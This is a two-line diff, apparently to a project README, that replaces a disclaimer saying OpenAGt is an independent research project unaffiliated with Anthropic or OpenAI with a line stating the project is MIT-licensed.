-**Note:** OpenAGt is an independent research project. It is not affiliated with, endorsed by, or supported by Anthropic, OpenAI, or the OpenAGt team.
+MIT. See [LICENSE](./LICENSE).
